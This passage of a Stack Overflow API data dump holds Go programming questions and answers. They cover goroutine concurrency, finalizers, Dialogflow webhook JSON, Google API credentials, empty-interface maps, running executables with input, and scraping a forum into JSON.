"https://stackoverflow.com/users/8690313/prajval-m"}, "is_accepted": false, "score": 1, "last_activity_date": 1540207808, "last_edit_date": 1540207808, "creation_date": 1540207606, "answer_id": 52928265, "question_id": 52928162, "link": "https://stackoverflow.com/questions/52928162/golang-paralelism/52928265#52928265", "title": "Golang paralelism", "body": "<p>In your case the function that prints a-z and 1-27 both start at the same time and you are waiting till both the go routines end. While having several go routines, your idea must be concurrent but if your hardware supports they might run parallel.</p>\n\n<p><a href=\"https://www.youtube.com/watch?v=cN_DpYBzKso&amp;t=1411s\" rel=\"nofollow noreferrer\">Concurreny is not parallelism</a></p>\n\n<p>Also context switches are heavy so most of the times they are most probably not done. Go routines are really light and hundreds of them can be running at the same time.</p>\n"}], "owner": {"reputation": 3865, "user_id": 4829408, "user_type": "registered", "accept_rate": 49, "profile_image": "https://www.gravatar.com/avatar/9ff8f70cf1f3f172084d5042abf22d64?s=128&d=identicon&r=PG&f=1", "display_name": "Src", "link": "https://stackoverflow.com/users/4829408/src"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 81, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1540208353, "creation_date": 1540207301, "last_edit_date": 1540208353, "question_id": 52928162, "link": "https://stackoverflow.com/questions/52928162/golang-paralelism", "title": "Golang paralelism", "body": "<p>I've been recently reading a lot about parallelism and concurrency in Go, and I can't wrap my head around it. When I was reading <a href=\"https://www.ardanlabs.com/blog/2014/01/concurrency-goroutines-and-gomaxprocs.html\" rel=\"nofollow noreferrer\">this article about concurrency and parallelism in Go</a>, I've came across this statement:</p>\n\n<blockquote>\n  <p>We can see that the goroutines are truly running in parallel. Both\n  goroutines start running immediately and you can see them both\n  competing for standard out to display their results.</p>\n</blockquote>\n\n<p>This statement is related to this program:</p>\n\n<pre><code>package main\n\nimport (\n    \"fmt\"\n    \"runtime\"\n    \"sync\"\n)\n\nfunc main() {\n    runtime.GOMAXPROCS(2)\n\n    var wg sync.WaitGroup\n    wg.Add(2)\n\n    fmt.Println(\"Starting Go Routines\")\n    go func() {\n        defer wg.Done()\n\n        for char := \u2018a\u2019; char &lt; \u2018a\u2019+26; char++ {\n            fmt.Printf(\"%c \", char)\n        }\n    }()\n\n    go func() {\n        defer wg.Done()\n\n        for number := 1; number &lt; 27; number++ {\n            fmt.Printf(\"%d \", number)\n        }\n    }()\n\n    fmt.Println(\"Waiting To Finish\")\n    wg.Wait()\n\n    fmt.Println(\"\\nTerminating Program\")\n}\n</code></pre>\n\n<p>Which outputs:</p>\n\n<pre><code>Starting Go Routines\nWaiting To Finish\na b 1 2 3 4 c d e f 5 g h 6 i 7 j 8 k 9 10 11 12 l m n o p q 13 r s 14\nt 15 u v 16 w 17 x y 18 z 19 20 21 22 23 24 25 26\nTerminating Program\n</code></pre>\n\n<p>So, does that means that in the runtime 2 cycles from the goroutines executing at the same time (so at this point we can call Go parallel language) or scheduler just switches context between those two threads (probably on fmt.Printf call) and executing only one cycle at one (concurrency, not true parallelism, as the author mentioned in the quote above)? </p>\n\n<p>I'm confused.</p>\n"}, {"tags": ["go", "finalizer"], "comments": [{"owner": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "edited": false, "score": 1, "creation_date": 1540211116, "post_id": 52927975, "comment_id": 92767676, "body": "sync.Pool and runtime.SetFinalizer combined? You either have a <i>very</i> special problem to solve or you are doing something fishy here."}], "answers": [{"tags": [], "owner": {"reputation": 42799, "user_id": 720999, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/04ee78e90161fa1c4dce14d615315160?s=128&d=identicon&r=PG", "display_name": "kostix", "link": "https://stackoverflow.com/users/720999/kostix"}, "is_accepted": true, "score": 4, "last_activity_date": 1540214063, "last_edit_date": 1540214063, "creation_date": 1540208783, "answer_id": 52928595, "question_id": 52927975, "link": "https://stackoverflow.com/questions/52927975/why-finalizer-is-never-called/52928595#52928595", "title": "Why finalizer is never called?", "body": "<blockquote>\n  <p>The above code tries to reuse object by <code>SetFinalizer</code>, but after debug I found finalizer is never called, why?</p>\n</blockquote>\n\n<p>The finalizer is only called on an object when the GC\nmarks it as unused and then tries to sweep (free) at the end\nof the GC cycle.</p>\n\n<p>As a corollary, if a GC cycle is never performed during the runtime of your program, the finalizers you set may never be called.</p>\n\n<p>Just in case you might hold a wrong assumption about the Go's GC, it may worth noting that Go does not employ reference counting on values; instead, it uses GC which works in parallel with the program, and the sessions during which it works happen periodically and are triggered by certain parameters like pressure on the heap produced by allocations.</p>\n\n<p>A couple assorted notes regarding finalizers:</p>\n\n<ul>\n<li><p>When the program terminates, no GC is forcibly run.</p>\n\n<p>A corollary of this is that a finalizer is not guaranteed\nto run at all.</p></li>\n<li><p>If the GC finds a finalizer on an object about to be freed,\nit calls the finalizer <em>but does not free the object.</em></p>\n\n<p>The object itself will be freed only at the next GC cycle \u2014\nwasting the memory.</p></li>\n</ul>\n\n<p>All in all, you appear as trying to implement destructors.\nPlease don't: make your objects implement the sort-of standard method called <code>Close</code> and state in the contract of your type that the programmer is required to call it when they're done with the object.\nWhen a programmer wants to call such a method no matter what, they use <code>defer</code>.</p>\n\n<p>Note that this approach works perfectly for all types in the Go\nstdlib which wrap resources provided by the OS\u2014file and socket descriptors. So there is no need to pretend your types are somehow different.</p>\n\n<p>Another useful thing to keep in mind is that Go was explicitly engineered to be no-nonsense, no-frills, <em>no-magic,</em> in-your-face language, and you're just trying to add magic to it.\nPlease don't, those who like decyphering layers of magic do program in <strike>Scala</strike> different languages.</p>\n"}], "owner": {"reputation": 25, "user_id": 10428270, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2540eeaf271bf56d3ce33dd96abf0a3f?s=128&d=identicon&r=PG&f=1", "display_name": "gopher", "link": "https://stackoverflow.com/users/10428270/gopher"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 334, "favorite_count": 0, "accepted_answer_id": 52928595, "answer_count": 1, "score": -2, "last_activity_date": 1540277083, "creation_date": 1540206752, "last_edit_date": 1540277083, "question_id": 52927975, "link": "https://stackoverflow.com/questions/52927975/why-finalizer-is-never-called", "title": "Why finalizer is never called?", "body": "<pre><code>var p = &amp;sync.Pool{\n    New: func() interface{} {\n        return &amp;serveconn{}\n    },\n}\n\nfunc newServeConn() *serveconn {\n    sc := p.Get().(*serveconn)\n    runtime.SetFinalizer(sc, (*serveconn).finalize)\n    fmt.Println(sc, \"SetFinalizer\")\n    return sc\n}\n\nfunc (sc *serveconn) finalize() {\n    fmt.Println(sc, \"finalize\")\n    *sc = serveconn{}\n    runtime.SetFinalizer(sc, nil)\n    p.Put(sc)\n}\n</code></pre>\n\n<p>The above code tries to reuse object by <code>SetFinalizer</code>, but after debug I found finalizer is never called, why?</p>\n\n<p><strong>UPDATE</strong></p>\n\n<p>This may be related:<a href=\"https://github.com/golang/go/issues/2368\" rel=\"nofollow noreferrer\">https://github.com/golang/go/issues/2368</a></p>\n"}, {"tags": ["go", "webhooks", "dialogflow-es", "actions-on-google", "google-assistant-sdk"], "answers": [{"tags": [], "owner": {"reputation": 454, "user_id": 1147542, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f1ebc556432ce8583a87a6f2ef3caefa?s=128&d=identicon&r=PG", "display_name": "Maverick", "link": "https://stackoverflow.com/users/1147542/maverick"}, "is_accepted": false, "score": 1, "last_activity_date": 1540201449, "creation_date": 1540201449, "answer_id": 52926401, "question_id": 52926138, "link": "https://stackoverflow.com/questions/52926138/how-to-send-fulfillmentmessages-as-part-of-dialogflow-v2-webhookresponse/52926401#52926401", "title": "How to send FulfillmentMessages as part of Dialogflow v2 WebhookResponse?", "body": "<p>As you said, the issue is with the json structure of the response. Below is a working webhook response</p>\n\n<pre><code>{\n\"fulfillmentMessages\": [\n    {\n        \"text\": {\n            \"text\": [\n                \"foo\",\n                \"bar\"\n            ]\n        }\n    }\n],\n\"fulfillmentText\": \"foobar\",\n\"source\": \"Test\"\n}\n</code></pre>\n\n<ol>\n<li><em>Messages</em> is not present in the actual structure.</li>\n<li><em>fullfillment_text</em> should be <em>fulfillmentText</em></li>\n<li>Outer <em>Text</em> should be <em>text</em></li>\n<li><em>fullfillment_messages</em> should be <em>fulfillmentMessages</em></li>\n</ol>\n"}], "owner": {"reputation": 174, "user_id": 3996094, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/3KKPC.jpg?s=128&g=1", "display_name": "RandomAndy", "link": "https://stackoverflow.com/users/3996094/randomandy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1220, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1540201449, "creation_date": 1540200478, "question_id": 52926138, "link": "https://stackoverflow.com/questions/52926138/how-to-send-fulfillmentmessages-as-part-of-dialogflow-v2-webhookresponse", "title": "How to send FulfillmentMessages as part of Dialogflow v2 WebhookResponse?", "body": "<p>I'm trying to send back fulfillment messages as part of Dialogflow's v2 API WebhookResponse.</p>\n\n<p><strong>This works:</strong></p>\n\n<p>Sending only a <code>FulfillmentText</code> as part of my response works fine (Testing the app in the Actions on Google Simulator replies with the proper <code>FulfillmentText</code> value) :</p>\n\n<pre><code>func random(c *gin.Context, wr dialogflow.WebhookRequest)  {\n    log.Println(\"Random action detected\")\n\n    fullfillment := dialogflow.WebhookResponse{\n        FulfillmentText: \"foobar\",\n    }\n\n    c.JSON(http.StatusOK, fullfillment)\n}\n</code></pre>\n\n<p>The JSON being sent back:</p>\n\n<pre><code>{\"fulfillment_text\":\"foobar\"}\n</code></pre>\n\n<p>The response in the Simulator:</p>\n\n<pre><code>{\n    \"conversationToken\": \"[]\",\n    \"finalResponse\": {\n    \"richResponse\": {\n        \"items\": [\n            {\n                \"simpleResponse\": {\n                    \"textToSpeech\": \"foobar\"\n                }\n            }\n        ]\n    }\n},\n    \"responseMetadata\": {\n    \"status\": {\n        \"message\": \"Success (200)\"\n    },\n    \"queryMatchInfo\": {\n        \"queryMatched\": true,\n            \"intent\": \"24db2044-f2fb-4607-9897-1de757990622\"\n    }\n}\n}\n</code></pre>\n\n<p><strong>This doesn't:</strong></p>\n\n<p>But as soon as I try to send back any actual messages (Text Message, Basic Card, Simple Response, etc.) as part of <code>FulfillmentMessages</code>, the test fails:</p>\n\n<pre><code>func random(c *gin.Context, wr dialogflow.WebhookRequest)  {\n    log.Println(\"Random action detected\")\n\n    textMessage := dialogflow.Intent_Message_Text{\n        Text: []string{\"foo\", \"bar\"},\n    }\n\n    fullfillment := dialogflow.WebhookResponse{\n        FulfillmentText: \"foobar\",\n        FulfillmentMessages: []*dialogflow.Intent_Message{\n            {\n                Message: &amp;dialogflow.Intent_Message_Text_{\n                    Text: &amp;textMessage,\n                },\n            },\n        },\n    }\n\n    c.JSON(http.StatusOK, fullfillment)\n}\n</code></pre>\n\n<p>The JSON being sent back:</p>\n\n<pre><code>{\n    \"fulfillment_text\":\"foobar\",\n    \"fulfillment_messages\":[\n        {\n            \"Message\":{\n                \"Text\":{\n                    \"text\":[\n                        \"foo\",\n                        \"bar\"\n                    ]\n                }\n            }\n        }\n    ]\n}\n</code></pre>\n\n<p>The response in the Simulator:</p>\n\n<pre><code>{\n    \"responseMetadata\": {\n    \"status\": {\n        \"code\": 10,\n            \"message\": \"Failed to parse Dialogflow response into AppResponse because of empty speech response\",\n            \"details\": [\n            {\n                \"@type\": \"type.googleapis.com/google.protobuf.Value\",\n                \"value\": \"{\\\"id\\\":\\\"917d8ac3-3f0f-4953-b556-4dec27b8bbb8\\\",\\\"timestamp\\\":\\\"2018-10-22T09:00:45.488Z\\\",\\\"lang\\\":\\\"en-us\\\",\\\"result\\\":{},\\\"alternateResult\\\":{},\\\"status\\\":{\\\"code\\\":206,\\\"errorType\\\":\\\"partial_content\\\",\\\"errorDetails\\\":\\\"Webhook call failed. Error: Failed to parse webhook JSON response: Cannot find field: Message in message google.cloud.dialogflow.v2.Intent.Message.\\\"},\\\"sessionId\\\":\\\"ABwppHHSbrqOCPRp_DAPDLepL6YjSNpbzQ61CIBDTMl99rtRqfaWq-y0HtExb1--k6bcaL4CACQMeiVF3p-x5qk\\\"}\"\n            }\n        ]\n    }\n}\n}\n</code></pre>\n\n<p>I am assuming that the JSON that my web service sends back is wrong, since it returns <code>... Cannot find field: Message ...</code> as part of its response.\nI am using the proper Golang SDK for Dialogflow though (<a href=\"https://godoc.org/google.golang.org/genproto/googleapis/cloud/dialogflow/v2#WebhookResponse\" rel=\"nofollow noreferrer\">https://godoc.org/google.golang.org/genproto/googleapis/cloud/dialogflow/v2#WebhookResponse</a>)</p>\n\n<p>This was tested on Actions on Google's Simulator as well as running the actual Google Assistant on a Pixel 2.</p>\n\n<p>Can anybody point me in the right direction what I am doing wrong?</p>\n"}, {"tags": ["go", "google-vision"], "answers": [{"tags": [], "owner": {"reputation": 1263, "user_id": 7099984, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cb73d10a9ce4b91379b514722601f9ee?s=128&d=identicon&r=PG&f=1", "display_name": "myxaxa", "link": "https://stackoverflow.com/users/7099984/myxaxa"}, "is_accepted": false, "score": 0, "last_activity_date": 1540199999, "creation_date": 1540199999, "answer_id": 52925999, "question_id": 52925404, "link": "https://stackoverflow.com/questions/52925404/alternate-way-to-set-credentials-for-google-application-credentials/52925999#52925999", "title": "Alternate way to set credentials for GOOGLE_APPLICATION_CREDENTIALS", "body": "<p>i do not know how it on Google Vision Api, but for the Google Sheets Api there is such stuff:</p>\n\n<pre><code>config, err := google.ConfigFromJSON(b, \"https://www.googleapis.com/auth/spreadsheets.readonly\")\n</code></pre>\n\n<p>so b is a slice taken from the file <code>credentials.json</code> u can just take it from any other place by yourself</p>\n"}], "owner": {"reputation": 1491, "user_id": 629960, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/2i6rf.jpg?s=128&g=1", "display_name": "Roman Gelembjuk", "link": "https://stackoverflow.com/users/629960/roman-gelembjuk"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 304, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1540214236, "creation_date": 1540197914, "last_edit_date": 1540214236, "question_id": 52925404, "link": "https://stackoverflow.com/questions/52925404/alternate-way-to-set-credentials-for-google-application-credentials", "title": "Alternate way to set credentials for GOOGLE_APPLICATION_CREDENTIALS", "body": "<p>I've a Go app that uses the <em>Google Vision API</em> and <em>Google Video intelligence</em> API.\nTo enter my credentials, I set the environment variable called <code>GOOGLE_APPLICATION_CREDENTIALS</code>. To do so, I assign a file path to this variable that points to the directory where my credentials are stored in.</p>\n\n<p><em>Problem:</em></p>\n\n<p>My credentials are <em>not</em> initially saved in a file. Instead they are assigned to a  string variable inside my app.\nAs a workaround, I store that value to a temporary file and then assign it's path to <code>GOOGLE_APPLICATION_CREDENTIALS</code>, like described above.</p>\n\n<p><em>Question:</em></p>\n\n<p>Is it possible to set API credentials for <code>cloud.google.com/go/vision/apiv1</code> without this file?</p>\n"}, {"tags": ["dictionary", "go"], "comments": [{"owner": {"reputation": 60130, "user_id": 13860, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/6bdc06836b7bcec9fce2c5c6e5242192?s=128&d=identicon&r=PG", "display_name": "Flimzy", "link": "https://stackoverflow.com/users/13860/flimzy"}, "edited": false, "score": 0, "creation_date": 1540196617, "post_id": 52925043, "comment_id": 92759444, "body": "What happens when you try?"}, {"owner": {"reputation": 24772, "user_id": 770830, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/a3943e02574f64dabaa71603264c9c28?s=128&d=identicon&r=PG", "display_name": "bereal", "link": "https://stackoverflow.com/users/770830/bereal"}, "edited": false, "score": 1, "creation_date": 1540196750, "post_id": 52925043, "comment_id": 92759509, "body": "Yes, that is accurate. <code>interface{}</code> stands for &quot;any type&quot;, not only in maps."}], "answers": [{"tags": [], "owner": {"reputation": 1604, "user_id": 3351097, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/yInN3.jpg?s=128&g=1", "display_name": "Maxian Nicu", "link": "https://stackoverflow.com/users/3351097/maxian-nicu"}, "is_accepted": false, "score": 4, "last_activity_date": 1540197615, "creation_date": 1540197615, "answer_id": 52925327, "question_id": 52925043, "link": "https://stackoverflow.com/questions/52925043/about-map-in-golang-programming-language/52925327#52925327", "title": "About Map in Golang Programming Language", "body": "<p>Actually, it has nothing specific with map. But response to your question is <code>yes</code>. You can insert anything you want inside.</p>\n\n<p>Definition for empty interface from \"A Tour of Go\"</p>\n\n<blockquote>\n  <p>An empty interface may hold values of any type. (Every type implements at least zero methods.)</p>\n</blockquote>\n\n<p>Check example on <a href=\"https://tour.golang.org/methods/14\" rel=\"nofollow noreferrer\">A Tour of Go</a></p>\n"}], "owner": {"reputation": 5, "user_id": 10092586, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a4260b578fb47f449bdcefb6fc4d1ec6?s=128&d=identicon&r=PG&f=1", "display_name": "The Junior", "link": "https://stackoverflow.com/users/10092586/the-junior"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 54, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1540197615, "creation_date": 1540196523, "question_id": 52925043, "link": "https://stackoverflow.com/questions/52925043/about-map-in-golang-programming-language", "title": "About Map in Golang Programming Language", "body": "<p>I found the code</p>\n\n<pre><code>newMap := map[string]interface{}{\n\n  \"string1\" : 1,\n  \"string2\" : \"hello\",\n  \"string3\" : map[string]string{\n     \"hello\" : \"hello there\"\n   }\n\n}\n</code></pre>\n\n<p>My guess is that If we use interface for map as the value type, then we can insert any type to value, is it correct?</p>\n"}, {"tags": ["go", "executable"], "comments": [{"owner": {"reputation": 750, "user_id": 2947756, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qpCxL.png?s=128&g=1", "display_name": "xReprisal", "link": "https://stackoverflow.com/users/2947756/xreprisal"}, "edited": false, "score": 0, "creation_date": 1540194444, "post_id": 52924492, "comment_id": 92758298, "body": "You mean something like this: <a href=\"https://stackoverflow.com/questions/10473800/in-go-how-do-i-capture-stdout-of-a-function-into-a-string\" title=\"in go how do i capture stdout of a function into a string\">stackoverflow.com/questions/10473800/&hellip;</a>? It allows to capture also stdout of command and whatnot"}, {"owner": {"reputation": 19, "user_id": 10539233, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e2aabf629cc9da6820d569aa94458cd?s=128&d=identicon&r=PG&f=1", "display_name": "Jessica Stu", "link": "https://stackoverflow.com/users/10539233/jessica-stu"}, "reply_to_user": {"reputation": 750, "user_id": 2947756, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qpCxL.png?s=128&g=1", "display_name": "xReprisal", "link": "https://stackoverflow.com/users/2947756/xreprisal"}, "edited": false, "score": 0, "creation_date": 1540194709, "post_id": 52924492, "comment_id": 92758446, "body": "I mean like a binary on executing asks for your name and prints <code>hello name</code>. Here, the above program doesn&#39;t ask for input and prints hello and ends. SO how to get the input for name?"}, {"owner": {"reputation": 39512, "user_id": 1239701, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/95ca4e887354416993fd91e2e16c4380?s=128&d=identicon&r=PG", "display_name": "Not_a_Golfer", "link": "https://stackoverflow.com/users/1239701/not-a-golfer"}, "edited": false, "score": 0, "creation_date": 1540194863, "post_id": 52924492, "comment_id": 92758545, "body": "You can either pass a command line argument and read it inside the child process with the <code>flag</code> package, or if you want dynamic, interactive input, you can hook into the child process&#39; stdin, see: <a href=\"https://golang.org/pkg/os/exec/#example_Cmd_StdinPipe\" rel=\"nofollow noreferrer\">golang.org/pkg/os/exec/#example_Cmd_StdinPipe</a>"}, {"owner": {"reputation": 19, "user_id": 10539233, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e2aabf629cc9da6820d569aa94458cd?s=128&d=identicon&r=PG&f=1", "display_name": "Jessica Stu", "link": "https://stackoverflow.com/users/10539233/jessica-stu"}, "reply_to_user": {"reputation": 39512, "user_id": 1239701, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/95ca4e887354416993fd91e2e16c4380?s=128&d=identicon&r=PG", "display_name": "Not_a_Golfer", "link": "https://stackoverflow.com/users/1239701/not-a-golfer"}, "edited": false, "score": 0, "creation_date": 1540195948, "post_id": 52924492, "comment_id": 92759080, "body": "@Not_a_Golfer I tried the given solution its not working and the programs are going to dynamic so it has to be interactive. Thanks anyway!"}, {"owner": {"reputation": 4780, "user_id": 2133484, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5b491cf2d331464c4655247dc43e3d89?s=128&d=identicon&r=PG", "display_name": "Arman Ordookhani", "link": "https://stackoverflow.com/users/2133484/arman-ordookhani"}, "edited": false, "score": 0, "creation_date": 1540205441, "post_id": 52924492, "comment_id": 92764470, "body": "I don&#39;t get your exact problem. Do you want to connect your stdin to the command&#39;s stdin while the command is running?"}], "answers": [{"comments": [{"owner": {"reputation": 19, "user_id": 10539233, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e2aabf629cc9da6820d569aa94458cd?s=128&d=identicon&r=PG&f=1", "display_name": "Jessica Stu", "link": "https://stackoverflow.com/users/10539233/jessica-stu"}, "edited": false, "score": 0, "creation_date": 1540197931, "post_id": 52925258, "comment_id": 92760105, "body": "its not just about <code>hello name</code> . I mean taking input for any executable."}, {"owner": {"reputation": 750, "user_id": 2947756, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qpCxL.png?s=128&g=1", "display_name": "xReprisal", "link": "https://stackoverflow.com/users/2947756/xreprisal"}, "reply_to_user": {"reputation": 19, "user_id": 10539233, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e2aabf629cc9da6820d569aa94458cd?s=128&d=identicon&r=PG&f=1", "display_name": "Jessica Stu", "link": "https://stackoverflow.com/users/10539233/jessica-stu"}, "edited": false, "score": 0, "creation_date": 1540198725, "post_id": 52925258, "comment_id": 92760517, "body": "You could copy/iterate over code that takes input as many times as you wish."}, {"owner": {"reputation": 19, "user_id": 10539233, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e2aabf629cc9da6820d569aa94458cd?s=128&d=identicon&r=PG&f=1", "display_name": "Jessica Stu", "link": "https://stackoverflow.com/users/10539233/jessica-stu"}, "edited": false, "score": 0, "creation_date": 1540201108, "post_id": 52925258, "comment_id": 92762024, "body": "that&#39;s the thing, I won&#39;t know how many time the running program is gonna take input Maybe it is 0 times if it just shows some detail fetched from a page and maybe 100, 1000 times. Thats the why i want that the control is fully transferred to that executable and transferred back when its execution is complete."}, {"owner": {"reputation": 750, "user_id": 2947756, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qpCxL.png?s=128&g=1", "display_name": "xReprisal", "link": "https://stackoverflow.com/users/2947756/xreprisal"}, "reply_to_user": {"reputation": 19, "user_id": 10539233, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e2aabf629cc9da6820d569aa94458cd?s=128&d=identicon&r=PG&f=1", "display_name": "Jessica Stu", "link": "https://stackoverflow.com/users/10539233/jessica-stu"}, "edited": false, "score": 0, "creation_date": 1540201480, "post_id": 52925258, "comment_id": 92762228, "body": "Sorry, I&#39;ve finally understood the issue. I&#39;m gonna tinker with it a bit after work if nobody comes up with answer before that."}], "tags": [], "owner": {"reputation": 750, "user_id": 2947756, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qpCxL.png?s=128&g=1", "display_name": "xReprisal", "link": "https://stackoverflow.com/users/2947756/xreprisal"}, "is_accepted": false, "score": 0, "last_activity_date": 1540197356, "creation_date": 1540197356, "answer_id": 52925258, "question_id": 52924492, "link": "https://stackoverflow.com/questions/52924492/taking-input-when-executing-binary-in-go/52925258#52925258", "title": "Taking input when executing binary in Go", "body": "<p>This code asks for your name and then passes it to <code>./hello</code> binary which reads first argument and outputs the first argument.</p>\n\n<pre><code>package main\n\nimport (\n    \"bufio\"\n    \"fmt\"\n    \"log\"\n    \"os\"\n    \"os/exec\"\n)\n\nfunc main() {\n    reader := bufio.NewReader(os.Stdin)\n    fmt.Print(\"What's your name: \")\n    name, _ := reader.ReadString('\\n')\n    command := exec.Command(\"./hello\", name)\n\n    out, err := command.Output()\n    if err != nil {\n        log.Println(err)\n    }\n    fmt.Println(string(out))\n}\n</code></pre>\n\n<p>hello.go:</p>\n\n<pre><code>package main\n\nimport (\n    \"fmt\"\n    \"os\"\n)\n\nfunc main() {\n    fmt.Println(fmt.Sprintf(\"hello %s\", os.Args[1]))\n}\n</code></pre>\n"}], "owner": {"reputation": 19, "user_id": 10539233, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e2aabf629cc9da6820d569aa94458cd?s=128&d=identicon&r=PG&f=1", "display_name": "Jessica Stu", "link": "https://stackoverflow.com/users/10539233/jessica-stu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 572, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1540198483, "creation_date": 1540194197, "last_edit_date": 1540198483, "question_id": 52924492, "link": "https://stackoverflow.com/questions/52924492/taking-input-when-executing-binary-in-go", "title": "Taking input when executing binary in Go", "body": "<p>I am using below code snippet :- </p>\n\n<pre><code>command:= exec.Command(\"./\"+order)\n\nout, err := command.Output()\nif err != nil {\n   log.Println(err)\n}\n\nfmt.Println(string(out))\n</code></pre>\n\n<p>here, \"order\" is the variable with name of binary in the current directory. When I run this code it doesn't ask for input and run through the binary till the end of it printing output statement. How do I get input for my binary executable while running it?</p>\n\n<p>I have tried using python in go also but to no effect.</p>\n"}, {"tags": ["json", "go", "web-crawler", "jsoup", "archlinux"], "comments": [{"owner": {"reputation": 407, "user_id": 3461549, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/73440cf71c71747a010d5114de459b10?s=128&d=identicon&r=PG&f=1", "display_name": "msound", "link": "https://stackoverflow.com/users/3461549/msound"}, "edited": false, "score": 0, "creation_date": 1540267573, "post_id": 52923810, "comment_id": 92790600, "body": "Like Mohammad.Naser says, you need to use upper case if your want to export a variable or function. Please consider taking a tour of Go, so you can get your fundamentals right."}], "answers": [{"tags": [], "owner": {"reputation": 22, "user_id": 8272588, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/90c218aacc4811a43c1f527d5f94993e?s=128&d=identicon&r=PG&f=1", "display_name": "Mohammad.Naser", "link": "https://stackoverflow.com/users/8272588/mohammad-naser"}, "is_accepted": true, "score": 1, "last_activity_date": 1540192843, "creation_date": 1540192843, "answer_id": 52924153, "question_id": 52923810, "link": "https://stackoverflow.com/questions/52923810/crawl-a-site-with-jsoup-and-make-json-in-golang/52924153#52924153", "title": "crawl a site with jsoup and make json in golang", "body": "<p>There is a problem in your Message struct\nit must name 'link' with capital k ---&lt; Link</p>\n\n<pre><code>type Message struct {\nName string\nDate string\nLink string\n}\n</code></pre>\n\n<p>and output will be correct</p>\n\n<p>{\"Name\":\"\u0645\u0627\u0646\u062c\u0627\u0631\u0648 Manjaro\",\"Date\":\"2018-10-18 10:55:09\",\"Link\":\"viewforum.php?id=22\"}</p>\n"}], "owner": {"reputation": 600, "user_id": 4312860, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b605c132d5e3b2c917b0a7b0ac6e11ad?s=128&d=identicon&r=PG", "display_name": "Mehrdad Dolatkhah", "link": "https://stackoverflow.com/users/4312860/mehrdad-dolatkhah"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 226, "favorite_count": 1, "accepted_answer_id": 52924153, "answer_count": 1, "score": 1, "last_activity_date": 1540192843, "creation_date": 1540191462, "question_id": 52923810, "link": "https://stackoverflow.com/questions/52923810/crawl-a-site-with-jsoup-and-make-json-in-golang", "title": "crawl a site with jsoup and make json in golang", "body": "<p>I wanna crawl a site (bbs.archusers.ir) for making a new post or topic notification for users. </p>\n\n<p>I try to write below code for a reading name, last change date, and URL every section and save into struct and save struct into JSON object. but link part in my struct won't get any value and either appear in the console for me, this is my code</p>\n\n<pre><code>    package main\n\nimport (\n    \"fmt\"\n    \"github.com/anaskhan96/soup\"\n    \"log\"\n    \"os\"\n    \"encoding/json\"\n)\n\ntype Message struct {\n    Name string\n    Date string\n    link string\n\n}\n\ntype myJSON struct {\n    Array []Message\n}\n\nvar input []Message\n\nfunc main() {\n\n    resp, err := soup.Get(\"https://bbs.archusers.ir\")\n\n    if err != nil {\n        os.Exit(1)\n    }\n\n    doc := soup.HTMLParse(resp)\n    links := doc.Find(\"div\", \"id\", \"brdmain\").FindAll(\"a\")\n    for i := 0; i &lt; len(links); i += 2 {\n        link := Message{links[i].Text(), links[i+1].Text(), links[i].Attrs()[\"href\"] }\n        input = append(input, link)\n    }\n\n\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    jsondat := &amp;myJSON{input}\n    encjson, _ := json.Marshal(jsondat)\n    fmt.Println(string(encjson))\n\n}\n</code></pre>\n\n<p>which part I did wrong? </p>\n"}]